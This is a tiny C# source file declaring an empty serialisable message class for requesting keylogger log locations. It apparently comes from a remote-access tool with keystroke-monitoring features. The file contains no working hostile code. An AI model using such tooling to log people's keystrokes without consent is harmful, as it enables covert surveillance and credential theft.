using MessagePack;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Common.Messages.Monitoring.KeyLogger
{
    [MessagePackObject]
    public class GetKeyloggerLogsDirectory : IMessage
    {
    }
}
